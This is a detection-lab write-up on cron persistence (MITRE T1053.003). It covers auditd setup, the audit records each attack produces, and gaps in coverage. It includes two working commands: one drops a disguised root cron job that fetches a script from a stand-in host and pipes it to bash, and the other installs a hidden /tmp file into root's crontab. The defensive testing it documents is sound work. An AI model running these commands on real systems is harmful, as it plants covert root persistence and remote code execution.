# Attack 5 — Persistence via Cron (T1053.003)

**MITRE ATT&CK:** [T1053.003 — Scheduled Task/Job: Cron](https://attack.mitre.org/techniques/T1053/003/)

Follows Atomic Red Team's T1053.003 tests, which drop a job into cron so it runs on a
schedule with no further attacker interaction. Two of the documented placements are run
here to cover both common spots:

1. a file in `/etc/cron.d/` (system-wide, runs as whatever user the line names)
2. a line piped into `crontab -` (run under `sudo`, so it lands in root's crontab)

This is the schedule-based sibling of attack 3 (systemd persistence). Same goal —
code that re-runs itself — different mechanism, different log location, so it needs its
own detection.

## Instrumentation first

A default `auditd` has no rules, so nothing watches the cron paths. Detection 5 depends
on the `50-cron.rules` set being loaded first — see `setup/03-auditd-instrumentation.md`.
That step is part of the technique here: you don't get to detect cron persistence until
you've told the host to watch for it.

## Execution

**Vector 1 — `/etc/cron.d/` drop:**

```
sudo tee /etc/cron.d/pkg-sync > /dev/null <<'CRON'
# Package index sync
*/5 * * * * root /bin/bash -c 'curl -fsSL http://192.0.2.10/sync.sh | bash'
CRON
```

`pkg-sync` and the "Package index sync" comment are camouflage — it reads like a distro
housekeeping job. The payload line is the tell: a root cron entry that pulls a script
over HTTP and pipes it to a shell every 5 minutes. `192.0.2.10` is in the TEST-NET-1
documentation range, so nothing actually leaves the box.

**Vector 2 — `crontab -` (root's crontab):**

```
echo '*/10 * * * * /tmp/.hb' | sudo crontab -
```

A dot-prefixed path (`/tmp/.hb`) to keep the target out of a plain `ls`, installed via
`crontab -` reading from stdin. Run under `sudo`, so `crontab` operates on its effective
user — the entry lands in **root's** crontab (`/var/spool/cron/crontabs/root`), not
`analyst`'s. The audit `AUID` still resolves to `analyst` regardless (see Result), which
is exactly the attribution the detection leans on.

## Result

Against the loaded audit rules, both vectors register immediately:

- **cron.d drop:** a `PATH` record — `name="/etc/cron.d/pkg-sync"`, `nametype=CREATE` —
  plus a `SYSCALL` record, `comm="tee"`, `key="cron_persist"`.
- **root's crontab:** `SYSCALL` records `comm="crontab"` with `key="cron_exec"` (the
  binary running) and `key="cron_persist"` (its `openat`/`fchmod`/`renameat` on
  `/var/spool/cron/crontabs/`).

Every one carries `AUID="analyst"` — the audit login UID stays pinned to the real user
behind the `sudo`, which is what lets the detection name a person rather than just "root".

## Detection

See `detections/05-cron-persistence.md`.

## Honest gap

- **The `/tmp/.hb` and `192.0.2.10` payloads don't exist**, so the jobs error out when
  cron fires them. That's fine for this technique — the detection is about the job being
  *installed*, not about it succeeding — but it means there's no follow-on execution
  evidence to correlate against here.
- **`crontab -e` isn't covered by vector 2.** Interactive editing writes through a temp
  file in `/var/spool/cron/crontabs/`, which the directory watch still catches, but the
  `EXECVE` args look different (`crontab -e`, then an editor). Worth a dedicated test
  later.
